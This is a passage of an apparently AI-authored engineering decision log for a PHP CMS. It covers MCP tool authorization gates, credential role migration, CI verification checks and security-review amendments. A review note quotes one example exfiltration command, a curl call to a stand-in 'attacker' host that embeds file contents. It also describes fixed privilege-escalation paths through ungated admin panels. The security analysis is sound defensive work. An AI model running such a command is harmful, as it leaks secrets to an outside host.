- **The placeholder check's scope is `git check-attr export-ignore`, not a hand-written list** — the same authority that builds the release archive. That choice is what surfaced NEW-27, and it is also why the check is precise: bare `TODO` and `PLACEHOLDER` are deliberately NOT matched, because `install.php` ships Spanish copy where "TODO" means *all* and a CSS section header reads "CHART PLACEHOLDER". A check that cries wolf on correct content gets ignored, which is the failure this whole slice exists to prevent. Green at birth across **448** distributable files, recounted independently.
- **The i18n check is the invariant that actually exists here (user decision).** §1a names WordPress i18n sniffs, which are N/A per D-006. The real invariant is catalogue key parity, and it is not theoretical: slices 7 and 8 both added keys to all 20 catalogues **by hand**. Green at birth across **120 files in 6 sets** (core + 5 plugins), proven by injecting both a missing key and an extra one.
- **Minified-asset sync is deliberately NOT built** — D-038, not re-opened. All 68 tracked `*.min.*` are third-party vendor distributions and Klytos ships no minified first-party asset, so the drift the check exists to detect cannot occur. Its absence is stated in the script's own header so it reads as a decision rather than an oversight.
- **CI seeds the playground, and that is load-bearing rather than convenience.** 91 of 138 tests are the integration tier, which SKIPS rather than fails without a playground (proven in slice 1). Un-seeded CI would run 34% of the suite and report green, omitting every authorization refusal test — the subject of the entire sprint. A skip is therefore promoted to a hard CI failure. **D-027's consequence is stated rather than papered over**: PHPUnit 11 needs PHP 8.2+ while Klytos declares 8.1+, so the suite cannot run on the declared floor; 8.1 gets a syntax-only job, honestly labelled.
- **The changelog check does not guess a convention.** With one entry there is nothing to order, so it reports that explicitly instead of passing silently. Klytos has not established whether its changelog grows oldest-first (Keel §1a) or newest-first (the ecosystem norm); the second entry is when that gets decided, by a person.
- Every one of the six new checks was **proven to FAIL on an injected violation and pass once reverted** — ten probes, all fired, tree left clean — and the two WARNs were proven to go **quiet** when their condition is fixed, because one direction is half a test (L-010). Pinned permanently by `tests/Unit/KeelVerifyTest.php`, itself proven in three directions.
- Alternatives rejected (and why): **regenerator + verifier** (correct end state if INDEX ever outgrows hand-editing, but it is a large bespoke extractor whose silent failure mode is worse than the drift it prevents); **hard FAIL on the version touchpoints** (strongest gate, but it either blocks the sprint close or forces a version-number decision that Phase 7 owns and that needs the user's explicit approval); **a recorded baseline for the touchpoints** (the D-025 pattern, and rejected here because freezing a broken invariant normalises it — a baseline is right for 193 pre-existing lint violations, wrong for four values that must be one value); **CI on 8.2/8.3 only** (simplest, leaves the declared floor verified by nothing); **raising the support floor to 8.2** (clean, but it is a support-matrix change for a released product with an installed base and belongs in its own decision, D-027's trigger).
- Supersedes: none. Extends the `scripts/keel-verify` created by **D-032**. Opens **NEW-27** and **NEW-28**; makes **H-01** detectable without fixing it.
- **Amended after the slice's own review cycle, before commit.** Both review subagents plus a
  `docs-verifier` and a fresh-context playground-QA pass ran on the finished diff (docs included, per
  L-015). Recorded here rather than folded in silently, because the shape of what they caught is the
  transferable part — and because two of the findings are the slice's own subject turned on itself:
  - **The `security-auditor` returned a BLOCKING finding, and it was mine.** `.claude/settings.json`
    and `.cursor/cli.json` allowed `Bash(curl -D -:*)` and `Bash(curl -s -o /dev/null:*)` **unscoped
    to any host**, while the sibling entries three lines above pinned `php -S` and `nc` to
    `127.0.0.1`. A committed allow-list is a grant to run **without a confirmation prompt**, in a
    **public repo with forks**, so this is an exfiltration and SSRF primitive
    (`curl -s -o /dev/null "https://attacker/?d=$(cat …)"` matches the prefix). Written into the
    config of the project that spent slice 6 building an SSRF control. Both entries are now pinned to
    `http://127.0.0.1`. `.codex` and `.gemini` omit curl entirely and were unaffected.
  - **A check that scanned nothing reported PASS**, which is precisely what this slice exists to
    prevent. If `git check-attr` returned nothing, `$distributable` stayed empty and the placeholder
    check printed `PASS … (0 files)` — indistinguishable from "nothing to flag" — while its sibling
    `keel_git()` already SKIPped loudly for the same cause. It now FAILs with *"it has not passed —
    it did not run"*, proven by forcing the call to fail.
  - **The `proc_open` stdin/stdout write-then-read pattern would HANG, not fail**, once the candidate
    list outgrows the OS pipe buffer. At 448 files it is comfortably under; the failure mode arrives
    silently with repository growth. Replaced with a temp file.
  - **The guard added earlier in this same slice was bypassable by changing one letter.**
    `str_ends_with( $_SERVER['SCRIPT_NAME'], '/scripts/dev/router.php' )` is case-sensitive, and on
    the case-insensitive filesystems where the playground actually runs (macOS, Windows)
    `/scripts/dev/Router.php` served the file and MISSED the guard — verified by probe. Now
    lowercased and percent-decoded. Both reviewers found this independently; the security pass also
    established it is **not exploitable** (condition 1 blocks every production SAPI, and the rest of
    the file is an allow-list keyed to `/installer/`), so it is defence in depth, not a hole.
  - **CI was about to publish a live credential.** `seed-playground.php:327` echoes the freshly-minted
    MCP application password, and a GitHub Actions log on a public repo is world-readable and
    retained after the runner is destroyed. Not practically exploitable (the credential only
    authenticates against that job's own ephemeral storage and nothing in the workflow listens on a
    port) — and redirected anyway, because "unreachable" is a weaker guarantee than "not logged".
  - **My own comments claimed the four allow-lists were the "same command set". They are not** — the
    Codex and Cursor lists are genuinely narrower. The L-002 defect, in text written to prevent it,
    for the second slice running (L-015 was the same shape). Corrected to say *narrower, deliberately*.
  - **`KeelVerifyTest` demands 9 checks while the script documents a 7-check no-git path** — two files
    from one slice giving contradictory guarantees. Resolved in favour of requiring git, stated in the
    test rather than left implicit.
  - **The fresh-context playground-QA pass failed the document on operational sequencing**, and every
    fix landed before the close: the port was hardcoded 19 times with no substitution mechanism (now
    `$KPORT`); following section 1 leaves a server that makes the suite **error**; following section 4
    stores a comment that makes the suite **fail**, beside a paragraph promising no reseed is needed;
    section 5 probed the wrong port; and the seeder printed *"Log in as any of: owner / admin /
    editor / viewer"*, which NEW-11 makes false. Its verdict on the product half is worth recording:
    every product claim it checked was true to the digit — 177 tools, 26 commands, 5 CVEs, the full
    403/401/302 matrix, the honeypot semantics.
  - Confirmed sound against source by the security pass, not merely read: `upgrade-assert.php`'s and
    `seed-playground.php`'s `'cli'` guards (no HTTP-serving SAPI is ever literally `cli`);
    `composer.json` has no install hooks, so `composer install` cannot transitively reach
    `install.php` or `cli.php build`; `upgrade-test.sh` never touches the working checkout; and
    `ci.yml` has minimal `permissions`, no secrets, plain `pull_request` (not `pull_request_target`),
    and no interpolation of `github.*` context into any shell block.

## D-046 — MCP tool authorization is one enforcement point in `ToolRegistry::call()`, default-deny, with a per-request actor and a JSON-RPC refusal
- Date / phase: 2026-07-22 / Phase 5, Sprint 2 planning (the four underlying user decisions were taken 2026-07-21; the plan was approved 2026-07-22)
- Decision: NEW-02 is closed by a **single** enforcement point inside `ToolRegistry::call()` (`installer/core/mcp/tool-registry.php:159`), placed **above** the `mcp.handle_tool` filter (`:164`) so it covers plugin-handled tools as well as the built-in table. It denies by default — no actor, an unmapped tool, or a role that lacks the tool's capability all throw a typed `Klytos\Core\MCP\PermissionDeniedException`. The decision remains `UserManager::hasPermission()` (S-04, the ONE matrix); the gate asks it, it does not add a second one. The MCP credential's identity is carried per request on the `ToolRegistry` instance via a **new** `setActor( int|string $userId, string $role )` — the registry is already built fresh per request (`server.php:40`), so no global is introduced — set by `server.php` after authentication and by `chat-engine` from the session; `call()` and `listTools()` read the actor.
- **Why this shape and not the recorded one-liner:** D-020 / `authorization.md:217` said "reuse `klytos_require_permission()` at the ToolRegistry enforcement point". Dropped in as-is it would **deny 100% of MCP traffic**, because `klytos_require_permission()` resolves identity from the session and there is no session on the MCP path — `Auth::startSession()` runs only in the admin path (`auth.php:62`, from `admin/bootstrap.php:216` and the OAuth consent view), while `Router::handleMcp()` (`router.php:123-147`) → `mcp/server.php` never starts one, so `klytos_current_user()` returns null (`helpers-global.php:370-376`). Identity has to be built from the credential first (D-047), and the gate consumes that actor rather than the ambient session. Verified against source this session by two Explore agents.
- **Why above the plugin filter, verified not assumed:** `mcp.handle_tool` (`:164`) can satisfy a call and `return` (`:165-169`) before the registered-tool table at `:171`. A gate below it would leave every plugin-handled tool ungated — the same by-omission failure S-07 exists to close. `call()` is reached by exactly two callers repo-wide (`server.php:225`, `chat-engine.php:309`) and no third, so one gate covers the whole surface.
- **Refusal shape is part of the contract, and it is DICTATED by the transport, not chosen.** The MCP server speaks JSON-RPC error objects everywhere (`JsonRpc::error( int $code, string $message, mixed $data = null, string|int|null $id = null ): array`, `json-rpc.php:84-100`). So `klytos_deny('mcp')` is **not** reused — it is absent from the MCP path today (0 matches) and its `{error,code}` body is not a JSON-RPC error object. Each transport catches `PermissionDeniedException`: `server.php::handleToolsCall()` emits `http_response_code(403); Helpers::jsonResponse( JsonRpc::error( -32000, …, $id ), 403 )`, mirroring the existing 401 auth-failure block (`server.php:103-108`) and keeping the id correlation; `chat-engine` returns a model-visible tool error. **This explicit-status step is mandatory, not cosmetic:** the normal dispatch emits via `Helpers::jsonResponse( $response )` with no status arg, which defaults to **HTTP 200** (`server.php:177`), so a denial merely *returned* as an error array would ship as 200. Verified this session.
- **`tools/list` is filtered by the actor's capabilities via the same map, and `tools/call` gates independently.** The list filter runs in `listTools()` after the `mcp.tools_list` plugin filter (`tool-registry.php:103`) and before the return (`:113`), so plugin-added tools are filtered too; but `call()` never trusts what `tools/list` returned — a caller naming a tool the list omitted is gated on its own. Hiding is not access control; the gate is.
- Alternatives rejected (and why): **reuse `klytos_require_permission()` verbatim at the choke point** (the recorded plan — denies all MCP traffic, see above); **a coarse owner-only gate in `ToolRegistry` now** (closes the escalation fast but over-restricts legitimate editor/viewer MCP use and tends to be reverted under pressure — the D-020 argument); **gate below the `mcp.handle_tool` filter** (simpler diff, leaves all plugin tools ungated); **reuse `klytos_deny('mcp')`** (its body is not a JSON-RPC error object, so an MCP client cannot parse it as one).
- Supersedes: none. Implements **D-020**; consumes D-047's actor and D-048's map. Closes the forward reference at `authorization.md:217-221` (done in slice 4).
- **Implemented in slice 2, with three mechanism notes (outcome unchanged):** (1) `setActor()`'s signature is `setActor( int|string|null $userId, ?string $role )`, not the literal `int|string $userId, string $role` this decision sketched — a **bearer token has a null user_id** (D-047), and it is the sprint's own end-to-end proof credential, so a non-nullable user id could not represent it; a deleted user record (NEW-08) yields a null role. Both nullable cases deny, exactly the fail-closed intent. (2) The gate's decision lives in ONE private `denialReason()` that both `call()` (throws on a non-null reason) and `listTools()` (drops tools with a non-null reason) consume, so the enforcement and the list filter can never diverge. (3) A new **`mcp.access_denied` action** fires before the throw — the MCP audit hook, mirroring `auth.access_denied`; like it, it cannot reverse the decision. Proven end to end: a `role=viewer` bearer token is refused `klytos_delete_page` with a JSON-RPC error object + **HTTP 403** over real HTTP, an owner bearer is allowed the same tool, an unknown role and an unmapped tool are denied, and `tools/list` for a viewer returns 19 tools without any destructive one — every denial proven to FAIL against the ungated code first (L-016).

## D-047 — MCP credentials carry a role, resolved from the credential, with an idempotent boot migration; unknown or absent role denies
- Date / phase: 2026-07-22 / Phase 5, Sprint 2 planning (user decisions 2 and 3, taken 2026-07-21)
- Decision: The MCP identity is built from the presented credential, not from a session. `token-auth.php` stops discarding the authenticated subject (the OAuth `user` is surfaced at `oauth-server.php:557` and dropped at `token-auth.php:228`) and surfaces an actor `{user_id, role}` to `server.php`; credential records gain a **role**. `createBearerToken()` takes an optional role (default `owner`). A single idempotent boot migration (the D-021 shape) backfills the installed base: **existing app-password and bearer-token records → `owner`** (recording what is already true, not a weakening), and an OAuth token → the role of the username it already stores. A credential that resolves to **no usable role, or a role the matrix does not know, DENIES** — the same fail-closed direction as `klytos_current_user()` after D-021.
- **Why "migrate to owner" is honest rather than a widening:** today every credential that can exist already operates as owner, because there is no per-call gate at all (NEW-02) and app passwords are structurally pinned to `config['admin_user']` (`auth.php:588-592`). Stamping the existing records `owner` records the status quo; it grants nothing that is not already held. What the change adds is the *ability to mint a lower role* going forward — which is what makes the gate in D-046 able to reduce power at all.
- **The residual gap is stated plainly, not papered over (user decision 3):** an existing bearer token carries no user field (`auth.php:469-475`), so after migration it is an **unattributed credential holding owner**. That is recorded as its own finding with a trigger in `docs/reference/mcp-authorization.md` (slice 4) rather than implied away — the honest limit is that migration cannot attribute a credential the product never attributed.
- **Per-role application passwords stay out of scope (L-014 framing):** app passwords are structurally owner-only until the **NEW-11** authentication slice lets a non-`admin_user` account exist and authenticate; minting an app password at a lower role is that slice's work. So the sprint's genuine end-to-end proof is a **`role=viewer` bearer token** — the one credential mintable at a lower role today — denied a destructive tool over real HTTP.
- Verification required (not optional): the upgrade path is tested **from the real previous version** (`scripts/dev/upgrade-test.sh`, real v0.30.1), asserting existing credentials resolve to `owner` after the migration and that re-running boot does not double-apply it.
- Alternatives rejected (and why): **leave credentials role-less and gate only by a global** (no way to express a lower-privilege credential, so the gate can never reduce power — defeats the sprint's purpose); **migrate existing credentials to a low role** (breaks every live integration on upgrade, and misrepresents reality — they operate as owner today); **default an unknown role to `viewer`** (fail-open's cousin — a corrupted or plugin-defined role would silently gain viewer's surface; unknown must deny, matching D-021 and the fix NEW-02 demands of `chat-engine`).
- Supersedes: none. Prerequisite for **D-046**; mirrors **D-021**'s fail-closed-with-migration shape on the MCP credential axis.
- **Amended during slice 1 implementation, before commit — the app-password mechanism, not the outcome.** The Decision above said the migration stamps "existing app-password **and** bearer-token records → owner." In the code it is cleaner and DRYer to resolve the **application-password and OAuth roles from the user record** (via `UserManager::getByUsername()`) — exactly as this decision already specified for OAuth — and to stamp a role **only on bearer tokens**, which name no user and so have nowhere else to hold one. The outcome is unchanged: an existing app password still resolves to `owner`, because it is pinned to the admin user, who is the owner. The gain is one source of truth for a credential's role (the user record wherever a user exists), forward-compatible with per-user credentials under NEW-11 — the role follows the user automatically. So `migrateCredentialRoles()` touches **bearer tokens only**. Proven on a real upgraded install (`scripts/dev/upgrade-test.sh`: a v0.30.1 bearer token, role-less, is stamped `owner` at boot).
- **A footgun caught by the migration test, recorded because it is the transferable part (L-017):** the first `migrateCredentialRoles()` iterated `$tokensData['tokens'] ?? [] as &$stored`. Iterating the result of `??` **by reference** binds to a throwaway temporary, so the stamps never wrote back — the method returned a non-zero count while persisting nothing (which would have DENIED every pre-Sprint-2 bearer token). Caught only because the test asserted the **persisted role**, not the return value. Fixed by guarding the key and iterating the real array. The same pattern in the pre-existing `validateAppPassword()` silently drops the app-password `last_used` update — recorded as **NEW-29**, not fixed (adjacent, cosmetic; D-031's narrowing).

## D-048 — A central MCP tool→capability map governs both `tools/call` and `tools/list`; absent = deny; keel-verify check 10 enforces coverage
- Date / phase: 2026-07-22 / Phase 5, Sprint 2 planning
- Decision: A new central file `installer/core/mcp/tool-capabilities.php` holds the MCP tool→capability map, mirroring `installer/core/admin-gate.php`'s gate map exactly: keyed by tool name, a **capability string** requires it, `null` is an audited "no capability" info exception (each `null` carries its reason in a comment), and an **absent entry is DENIED**. The map is filterable through a new `mcp.tool_capabilities` filter so a plugin declares capabilities for its own tools (the `admin.gate_map` precedent, D-032). Both `ToolRegistry::call()` (D-046) and `listTools()` read this one map. `scripts/keel-verify` gains **check 10** (FAIL tier): every registered tool name must have a map entry or a plugin-declared capability, inserted at ~`scripts/keel-verify:628` between checks 7 and 8, with its stable prefix added to `tests/Unit/KeelVerifyTest.php` `EXPECTED_CHECKS` and row 10 added to `docs/keel-verify.md`. keel-verify goes 9 → **10** checks.
- **Why a central map and not a per-tool annotation:** the 169 live tools are registered across 33 files by free functions; a per-file annotation has the S-07 failure mode one file later — a new tool file defaults to *ungated*. A central map where omission denies inverts it: a new tool is refused until it is mapped deliberately, and check 10 fails the build when a registered name has no entry. This is the exact inversion slice 4 of Sprint 1 chose for the admin gate, reused rather than reinvented.
- **Why the same map drives `tools/list`:** if the list advertised tools the caller cannot call, an agent would plan around tools it will be refused — a worse experience than an honest list. Filtering the list by the actor's capabilities keeps the advertised surface equal to the usable one, while `call()` still gates independently so a hidden tool named directly is refused, not merely absent.
- **The `mcp.tool_capabilities` filter is a plugin-trust boundary, stated rather than buried:** like `admin.gate_map` and `auth.capabilities`, it can weaken a shipped capability, and plugins already run as first-party code here. What it cannot do is open a hole by omission — an absent entry denies. Recorded in the reference doc.
- Alternatives rejected (and why): **per-tool capability argument on `register()`** (spreads the decision across 33 files + every plugin, and a forgotten one defaults open); **derive the capability from the tool's `destructiveHint`/`readOnlyHint` annotations** (those describe *behaviour* for the model, not *authorization*; conflating them means an annotation edit silently changes who may call a tool); **no keel-verify check** (the map would rot — a new tool added without a mapping would be silently denied in production with no build-time signal, which is a different failure but still a failure).
- Supersedes: none. Extends the `scripts/keel-verify` created by D-032/D-045 with check 10; consumed by D-046.
- **Amended in slice 2 after code review — filter-injected CORE tools, not just plugins, declare through the filter.** The plan (and this decision) framed `mcp.tool_capabilities` as the mechanism by which *plugins* declare their tools' capabilities in slice 3, and slice 2 as "map only the 169 loader-registered core tools." The `code-reviewer` caught that this framing missed a third tool source: the **x402** micropayments module is *core*, loaded unconditionally at `App::boot()` Step 10g, yet it registers its 8 `klytos_x402_*` tools through `mcp.tools_list`/`mcp.handle_tool` exactly as a plugin does — so default-deny made all 8 unusable by every role including owner the moment the gate landed (owner's `tools/list` dropped 177→169). The resolution keeps this decision's shape intact: x402 declares its own tools' capabilities through `mcp.tool_capabilities` in `installer/core/x402-mcp-tools.php` (reads → `x402.view`, writes → `x402.manage`, capabilities x402 already defines in the matrix), which is precisely the filter's purpose. The **static core map stays at exactly the 169 loader-registered tools**, so check 10 (which enumerates the loader's 33 files and stubs the filter) is unaffected and correctly does **not** cover filter-injected sets — those are verified by their own tests. Recorded honestly: "map only the 169 loader tools" silently assumed the loader is the only core tool source; x402 proves it is not. The `exists()`-before-gate HTTP gap this surfaced is **NEW-30**, bound to slice 3.

## D-049 — `integrity-tools.php` is wired in and gated, and the tool loader fails loudly on a missing or misnamed registration
- Date / phase: 2026-07-22 / Phase 5, Sprint 2 planning (user decision 4)
- Decision: `installer/core/mcp/tools/integrity-tools.php` — present on disk, registering 3 tools (`klytos_integrity_check`, `klytos_integrity_status`, `klytos_integrity_check_plugin`) via `registerIntegrityTools()`, but **absent from the loader's hardcoded 33-file list** and called nowhere, so **dead** — is added to the loader and given capability-map entries like every other tool. In the same slice, the loader (`tool-registry.php:284-305`) stops skipping a listed file whose register function is absent by **silent fall-through** and instead **fails loudly** (throws), so an unfinished or misnamed registration is surfaced at boot/CI rather than shipping as a quietly-missing tool.
- **Why loud failure, per L-007:** an unfinished registration is *evidence*, not clutter — `integrity-tools.php` was dead for exactly the reason the loader could not tell "this file registers nothing" from "this file is not meant to be here". A silent `continue`/fall-through hides both. Making it loud means the next tool file added to the list either registers correctly or breaks the build with a named message — the S-07 lesson applied to the loader.
- **Count consequence, corrected honestly (slice 4):** wiring the 3 tools in moves the live count from **169** to **172** core tools, so the served figure becomes **172 core + x402 (filter-injected)**. The count-truth pass (slice 4) reconciles every surface (INDEX, audit, skills, reference) to the honest figures rather than carrying the stale 172/177/206.
- Alternatives rejected (and why): **delete `integrity-tools.php` as dead** (L-007 — deleting the quieter side of a disagreement destroys the evidence; the tools are real and wanted); **wire it in but leave the loader silent** (fixes this instance and leaves the mechanism that hid it, so the next dead tool file is invisible again); **fail loudly but leave the file unmapped** (check 10, D-048, would then fail the build correctly — but shipping three tools with no capability is the NEW-02 defect in miniature, so they are mapped in the same slice).
- Supersedes: none. Related to L-007 (unreachable code is evidence) and D-048 (the map the new tools join).
- **Implemented in slice 3 (2026-07-23), one mechanism note:** the loader's per-file logic is extracted into a public `ToolRegistry::registerToolFile( string $toolsDir, string $file )` that throws the typed `Klytos\Core\MCP\ToolRegistrationException` on a missing file OR a file that defines neither its namespaced nor its global register function. The extraction keeps `registerAllTools()`'s hardcoded `$toolFiles = [ … ]` literal intact (keel-verify check 10 parses it) while making the fail-loud contract exercisable per file by `McpToolLoaderTest` — proven in both directions (a missing file and a registers-nothing file each throw; a valid file registers). `integrity-tools.php` is the 34th list entry; its 3 tools are mapped at `site.configure` in the static map (mirroring admin `system-integrity.php`). keel-verify check 10 now reads **172 tools** and passes both directions.

## D-050 — NEW-30 resolved by making filter-injected tools callable over HTTP; slice-3 capability assignments and playground plugin activation
- Date / phase: 2026-07-23 / Phase 5, Sprint 2 slice 3 (user-confirmed this session)
- Decision: **NEW-30** — filter-injected tools (x402, the shipped plugins) were advertised by `tools/list` but answered "Unknown tool" on `tools/call` over HTTP, because `server.php::handleToolsCall()` rejects `!exists()` before the gate and `exists()` was register-only. Of the two fix shapes the audit recorded, the user chose **"make callable over HTTP"** over "narrow the doc claim": `ToolRegistry::exists()` now returns true when a tool is registered **or** declared in the capability map, so the call reaches `call()`, which gates it (`denialReason`) and dispatches it via `mcp.handle_tool`. `handleToolsCall()` also catches a typed `ToolNotFoundException` from `call()` (a mapped-but-unhandled tool) and maps it back to "Unknown tool" rather than a 500. A name neither registered nor declared is still unknown (fails closed). `exists()`'s only caller repo-wide is `server.php`, so the broadening is contained.
- **Why the "callable" option and not the doc-narrowing one:** the slice's whole purpose is to gate the shipped plugins' tools; leaving them advertised-but-uncallable over a direct MCP HTTP client after gating them undercuts that. NEW-30's own note bound the fix to slice 3 "in scope by construction". The change is ~10 lines and keeps the gate authoritative on the call path.
- **Slice-3 capability assignments (from the ONE matrix, no second matrix):** file integrity (3 core tools) → `site.configure` (mirrors admin `system-integrity.php` / `api/integrity.php`; even reading an integrity report exposes system internals); `klytos-forms` (16 tools) → `forms.manage` (the matrix's existing forms capability, owner/admin; forms carry submitted data and the matrix has no `forms.view`, so the whole domain sits at the manage bar); `klytos-importer` (10 tools) → `site.configure` (a whole-site migration fetching arbitrary external URLs and bulk-creating pages is an operations privilege, the mirror of `klytos_export_site`). The plugins declare theirs through the `mcp.tool_capabilities` filter (the x402 precedent, D-048), so keel-verify check 10 (static core map only) does not cover them — each is covered by its own test (`McpToolGateTest`, `McpGateHttpTest`).
- **Playground plugin activation:** the seed (`scripts/dev/seed-playground.php`) now activates `klytos-forms` and `klytos-importer` (state written directly, no `install.php`/asset-rebuild side effects), so the app loads their MCP filters at boot. A playground that verifies MCP tool authorization but never loads the shipped MCP plugins would not exercise the real surface. Consequence: the served count over HTTP is now **206** (172 core + 8 x402 + 16 forms + 10 importer) — the slice-4 count-truth pass reconciles the served/live/dead figures across every surface.
- **chat-engine advisory list:** `getAvailableTools()` now default-denies an unrecognized role to an empty list and closes the `function_exists`/null fail-opens (absent helper → viewer, the least-privileged real role). Slice 2 already made the gate authoritative (`call()` denies regardless, `listTools()` is capability-filtered), so this makes the advisory list honest rather than adding teeth — proven in isolation (`ChatEngineToolListTest`: an unknown role gets `[]` even when the base list is the full owner set).
- Alternatives rejected (and why): **narrow the doc claim, HTTP register-only** (the audit's other option — smaller change, but leaves the shipped plugins' tools uncallable via a direct MCP HTTP client right after gating them); **editor-level importer capability** (`pages.create`/`assets.manage` — more permissive, mixes capabilities across the plugin's tools; the whole-site external-fetch operation fails safe higher); **a `forms.view` split for forms reads** (a new capability with no requirement behind it — over-restriction at `forms.manage` fails safe); **activate plugins via `PluginLoader::activate()`** (runs `install.php` + a plugin-asset rebuild — unnecessary side effects for a seeder; direct state write is enough for boot to load them).
- Supersedes: none. Resolves audit **NEW-30**; extends **D-048** (the plugin-declared-capabilities mechanism) and **D-049** (the loader/integrity slice). The `authorization.md:217-221` forward reference and the full count reconciliation remain **slice 4**; **D-035** (`ai.use` widening to editor) is **not** touched here — its trigger fires at Sprint 2 close, to be confirmed with the user.
- **Review amendment (2026-07-23, before commit — L-015):** both review subagents ran on the finished diff and returned **no blocking findings**; the `security-auditor` traced the default-deny invariant end to end (the gate runs before any dispatch for a filter-injected tool; the `PermissionDeniedException` catch precedes the fallback catch, so a 403 never degrades to "Unknown tool"). The `code-reviewer`'s one substantive note: the fallback `catch (\RuntimeException)` in `handleToolsCall()` was **broader than its purpose** — a future `mcp.handle_tool` handler raising a plain `RuntimeException` would be masked as "Unknown tool" rather than surfacing as a real error. Fixed by introducing a typed **`Klytos\Core\MCP\ToolNotFoundException`** (thrown by `call()` only for the mapped-but-unhandled case) and catching exactly that; a plain `RuntimeException` now propagates. Pinned by `McpToolGateTest::testAMappedButUnhandledToolThrowsToolNotFound`. Two stale `scripts/keel-verify` comments ("integrity-tools.php … dead until slice 3", "live count is 169") were corrected to reflect the 34-file/172-tool reality. Cosmetic inner-paren style was left as-is (matches the file's slice-1/2 precedent; `phpcs --standard=phpcs.xml` clean).

## D-051 — `ai.use` widens to `editor` now that MCP tools are gated; D-035's trigger fired and is closed
- Date / phase: 2026-07-24 / Phase 5, Sprint 2 slice 4 (**user-confirmed this session** — D-035 recorded an explicit user-decision trigger and it was put to the user before anything was changed)
- Decision: The `ai.use` capability becomes **owner + admin + editor** in the ONE matrix (`UserManager::hasPermission()`), so an editor may reach the admin AI chat (`admin/ai-chat.php` and the chat actions of `admin/api/ai-chat.php`). `viewer` stays excluded.
- **Why now, and why this is not a loosening of a security control:** D-035 excluded `editor` for exactly one stated reason — the AI chat executes MCP tools and the MCP tool layer had **zero** permission checks (NEW-02), so reaching that surface was owner-equivalent power *regardless of the caller's role*. Sprint 2 closed NEW-02: every `ToolRegistry::call()` now passes a default-deny gate that asks the same matrix with the **caller's own** role, on both transports (`chat-engine` sets the actor from the session exactly as `server.php` sets it from the credential). The amplification the exclusion existed to prevent is gone, so the exclusion has nothing left to protect. D-035 wrote its own revisit trigger — "Sprint 2 close" — and this is it.
- **Why `viewer` stays out:** a read-only role has no authoring work for an agent to do, and the gate would refuse nearly everything it asked for — a surface that mostly answers "no" is a worse experience than one the role does not see. Not a security judgement; a product one. It is a one-line change if a requirement appears.
- **Proven, not asserted, and proven in the direction that matters:** both new expectations were run against the un-widened matrix first and **failed** — `AdminGateHttpTest` reported *"installer/admin/ai-chat.php as editor: expected 200, got 403"* on the real wire, and `AdminGateMapTest` failed on the matrix. The widening is asserted end to end (an editor's HTTP request to `ai-chat.php` returns 200; a viewer's returns 403), not by re-reading the map — the rule slice 4 of Sprint 1 set for the gate map.
- **The honest limit, stated rather than implied:** `Auth::login()` still validates only against `config['admin_user']` (**NEW-11**), so no editor account can actually log in to use this today. The widening is correct and takes effect the moment NEW-11 is fixed; it changes no reachable behaviour on a current install. Recorded here so a later reader does not mistake "no observable change in production" for "this decision did nothing".
- Alternatives rejected (and why): **keep owner+admin** (safe, but D-035's stated reason has expired, and an exclusion kept past its justification accumulates as unexplained restriction — the next reader inherits a rule with no live reason); **also widen to `viewer`** (nothing in the matrix makes a viewer's agent session useful, and it enlarges the surface for no requirement); **gate the chat on `mcp.manage` instead** (already rejected in D-035 for the right reason: it means "may mint MCP credentials", not "may consume AI", and the wrong mental model at exactly the point where the model matters).
- Supersedes: **D-035**. Depends on **D-046**/**D-048** (the gate and the map) being in force — if the MCP gate were ever removed, this widening would have to be reverted with it, and the comment at the `ai.use` row in `user-manager.php` says so.
- **Review amendment (2026-07-24, before commit — L-015): the `security-auditor` returned THREE blocking findings against this decision, two of them real, and the widening does not ship without the fix.** Both review subagents ran on the finished diff, docs included. The `code-reviewer` found no blocking issue (one stale why-comment in `admin-gate.php`, fixed). The `security-auditor` found what this decision's own justification had not checked: **`ai.use` does not bound what `ai-chat.php` exposes.** That page `require_once`s `partials/ai-panel-{$panel}.php` for a caller-supplied `?panel=`, and those four partials carried **zero** permission checks between them — `ai-panel-users.php` creates users and changes any account's password behind CSRF alone (work `users.php` reserves to `users.manage`, owner-only), `ai-panel-settings.php` writes site/email/SMTP settings (`site.configure`), and `api/ai-chat.php`'s `get_providers` returned `masked_key` (6+4 characters of every configured AI provider key) while its four sibling actions all require `site.configure`. Recorded as **NEW-31** and **fixed in this slice**: a panel→capability map in `ai-chat.php` mirroring each panel's standalone twin, absent = deny, running before `header.php`; and `get_providers` gated like its siblings. Proven both directions — against the unfixed code an editor got **200** on `?panel=users` and on `get_providers`.
  - **Two of the auditor's specific escalation routes do not exist and are recorded as refuted, not adopted:** `UserManager::create()` refuses a second owner and `update()` refuses `role = owner` outright, so "mint yourself an owner in one request" is blocked at the manager. The real path is create-an-`admin` plus `changePassword` on the owner's id — worse in effect, different in mechanism. Re-derived against source before acting (L-013).
  - **The honest sequencing point:** NEW-31 is **not** caused by this decision. It has been true since `ai.use` was created (D-035), and it is live for **`admin`** today, one tier above the role this decision adds. What D-051 did was make it *visible*, because `ai.use` and the panels' capabilities had been the identical owner+admin set until now — a check missing exactly where two capabilities coincide, for the third time in this project. Had the widening shipped without the audit, this decision's central claim ("an editor in the chat can do exactly what an editor may do, and no more") would have been **false**, which is the L-002 defect inside a security decision.
  - **The third finding is verified and deliberately retained:** `chat-engine`'s generic `catch (\Throwable)` surfaces `PermissionDeniedException::getMessage()` — the internal `denialReason()` text naming the caller's role and the required capability — to the chat UI and the model, where `server.php` deliberately sends the neutral catalogue string instead. Kept, with the reasoning recorded rather than re-litigated: the audience differs. The HTTP transport answers an arbitrary MCP client; the chat answers the operator's **own authenticated admin session**, which already knows its role, and the capability identifiers are **published documentation** in this open-source product (`docs/reference/authorization.md` prints the entire matrix). Nothing non-public crosses the boundary, and the model needs the reason to adapt. This matches the position already recorded in the slice-2 review follow-ups; it is not re-opened here.

## D-052 — D-029's version floors are stale and are raised to reach its own "audit to zero"; the re-vendor is three packages plus a seventeenth
- Date / phase: 2026-07-25 / Phase 5, Sprint 3 planning (user decision this session, on a question put before anything was changed)
- Decision: The NEW-05 remediation targets **`guzzlehttp/guzzle` 7.15.1**, **`guzzlehttp/psr7` 2.13.0** and **`guzzlehttp/promises` 2.5.1**, and accepts **`symfony/polyfill-php80`** as a new vendored package (16 → **17**). D-029's remediation *shape* is unchanged — hand-pin, re-vendor, re-audit to zero, update `LICENSE-THIRD-PARTY.md`, let `tests/Unit/VendorAiManifestTest.php` prove the four records agree. What changes is the two version numbers written inside it.
